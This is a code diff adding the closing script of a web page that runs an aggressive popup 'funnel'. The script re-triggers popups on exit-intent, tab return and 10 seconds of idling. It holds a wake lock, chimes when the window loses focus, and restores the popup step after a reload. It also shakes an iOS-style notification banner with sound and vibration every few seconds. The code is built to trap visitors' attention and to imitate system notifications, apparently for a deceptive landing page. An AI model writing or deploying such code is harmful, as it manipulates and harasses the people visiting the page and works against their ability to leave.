+  });
+  document.addEventListener('mouseleave', (e) => {
+    if (e.clientY <= 0) reengage('mouseleave-top');
+  });
+
+  // 2. Tab-return re-engagement.
+  let wasHidden = false;
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+      wasHidden = true;
+    } else if (wasHidden) {
+      wasHidden = false;
+      reengage('tab-return');
+    }
+  });
+
+  // 3. Idle timer — re-prompt after N seconds of no activity. Reads
+  // idleSeconds from config; defaults to 10.
+  const idleMs = ((cfg && cfg.timings && cfg.timings.idleSeconds) || 10) * 1000;
+  let lastActivity = Date.now();
+  const bump = () => { lastActivity = Date.now(); };
+  ['mousemove', 'mousedown', 'keydown', 'touchstart', 'touchmove', 'wheel', 'scroll']
+    .forEach(ev => window.addEventListener(ev, bump, { passive: true, capture: true }));
+  setInterval(() => {
+    if (Date.now() - lastActivity >= idleMs) {
+      reengage('idle');
+      lastActivity = Date.now();
+    }
+  }, 1000);
+
+  // 4. Wake lock — keep the screen from dimming while reading.
+  let wakeLock = null;
+  async function acquireWakeLock() {
+    try {
+      if ('wakeLock' in navigator) {
+        wakeLock = await navigator.wakeLock.request('screen');
+      }
+    } catch (e) {}
+  }
+  window.addEventListener('click', acquireWakeLock, { once: true });
+  document.addEventListener('visibilitychange', () => {
+    if (!document.hidden && wakeLock === null) acquireWakeLock();
+  });
+
+  // 5. Page-blur soft chime — gentle tone when window loses focus.
+  window.addEventListener('blur', () => {
+    if (document.hidden) return; // visibilitychange handles full-tab switches
+    playDefaultTone();
+  });
+
+  // 6. Reload-resilience — persist current funnel step so a Ctrl+R or
+  // accidental refresh restores the visitor to where they were.
+  const SS_KEY = 'funnel-state';
+  let funnelState = 'init';
+  function setState(s) {
+    funnelState = s;
+    try { sessionStorage.setItem(SS_KEY, JSON.stringify({ s, t: Date.now() })); } catch (e) {}
+  }
+  function readState() {
+    try {
+      const raw = sessionStorage.getItem(SS_KEY);
+      if (!raw) return null;
+      const parsed = JSON.parse(raw);
+      // Drop state older than 30 minutes — treat as fresh visit.
+      if (Date.now() - parsed.t > 30 * 60 * 1000) return null;
+      return parsed.s;
+    } catch (e) { return null; }
+  }
+  const showPopup_  = showPopup;
+  const hidePopup_  = hidePopup;
+  const showPopup2_ = showPopup2;
+  const hidePopup2_ = hidePopup2;
+  showPopup  = () => { showPopup_();  setState('popup1'); };
+  hidePopup  = () => { hidePopup_();  if (funnelState === 'popup1') setState('init'); };
+  showPopup2 = () => { showPopup2_(); setState('popup2'); };
+  hidePopup2 = () => { hidePopup2_(); if (funnelState === 'popup2') setState('init'); };
+
+  function vibrate(pattern) {
+    try { if (navigator.vibrate) navigator.vibrate(pattern); } catch (e) {}
+  }
+  function shakeNotif() {
+    if (!notif) return;
+    notif.classList.remove('shake');
+    void notif.offsetWidth;
+    notif.classList.add('shake');
+    setTimeout(() => notif.classList.remove('shake'), 600);
+  }
+
+  // Resume the funnel from where the visitor left off if they reloaded.
+  let restoredState = null;
+  try {
+    const raw = sessionStorage.getItem('funnel-state');
+    if (raw) {
+      const parsed = JSON.parse(raw);
+      if (Date.now() - parsed.t < 30 * 60 * 1000) restoredState = parsed.s;
+    }
+  } catch (e) {}
+
+  const notifDelay  = restoredState ? 0 : STEP_DELAY;
+  const popupDelay  = restoredState ? 200 : STEP_DELAY * 2;
+
+  // Recurring attention pulse — fires the iOS wiggle/sound combo every few
+  // seconds while the notification is visible AND no popup is yet covering
+  // the screen. Keeps the visitor's eye drawn back to the banner.
+  let notifPulseTimer = null;
+  function startNotifPulse() {
+    if (notifPulseTimer || !notif) return;
+    notifPulseTimer = setInterval(() => {
+      if (notif.classList.contains('hidden')) return;
+      // Don't pulse while a popup is fully covering the screen.
+      const popupOpen = !overlay.classList.contains('hidden') || !overlay2.classList.contains('hidden');
+      if (popupOpen) return;
+      shakeNotif();
+      playSound('notification');
+      vibrate([120, 60, 120]);
+    }, 4500);
+  }
+  function stopNotifPulse() {
+    if (notifPulseTimer) { clearInterval(notifPulseTimer); notifPulseTimer = null; }
+  }
+
+  if (notif) {
+    setTimeout(() => {
+      notif.classList.remove('hidden');
+      notif.classList.add('show');
+      playSound('notification');
+      vibrate([200, 100, 200]);
+      setTimeout(shakeNotif, 350);
+      // Start the recurring pulse a moment after the entrance settles.
+      setTimeout(startNotifPulse, 1500);
+    }, notifDelay);
+  }
+  setTimeout(() => {
+    if (restoredState === 'popup2') {
+      showPopup2();
+      playSound('popup2');
+    } else {
+      showPopup();
+      playSound('popup1');
+    }
+    vibrate([150]);
+  }, popupDelay);
+
+  let lastPayload = '';
+  function sendLayoutIfChanged() {
+    if (!frame.contentWindow) return;
+    const notifRect = (notif && !notif.classList.contains('hidden')) ? notif.getBoundingClientRect() : null;
+    let popupRect = null;
+    if (overlay && !overlay.classList.contains('hidden') && popupEl) popupRect = popupEl.getBoundingClientRect();
+    else if (overlay2 && !overlay2.classList.contains('hidden') && popupEl2) popupRect = popupEl2.getBoundingClientRect();
+    const payload = {
+      type: 'layout',
+      viewportH: window.innerHeight,
+      notifBottom: notifRect ? Math.round(notifRect.bottom) : 0,
+      popupTop: popupRect ? Math.round(popupRect.top) : null,
+      popupBottom: popupRect ? Math.round(popupRect.bottom) : null
+    };
+    const key = JSON.stringify(payload);
+    if (key === lastPayload) return;
+    lastPayload = key;
+    try { frame.contentWindow.postMessage(payload, '*'); } catch (e) {}
+  }
+
+  frame.addEventListener('load', () => setTimeout(sendLayoutIfChanged, 100));
+  window.addEventListener('resize', sendLayoutIfChanged);
+
+  const observer = new MutationObserver(sendLayoutIfChanged);
+  if (notif) observer.observe(notif, { attributes: true, attributeFilter: ['class'] });
+  if (overlay) observer.observe(overlay, { attributes: true, attributeFilter: ['class'] });
+  if (overlay2) observer.observe(overlay2, { attributes: true, attributeFilter: ['class'] });
+  if (notif) notif.addEventListener('transitionend', sendLayoutIfChanged);
+})();
+</script>
+</body>
+</html>
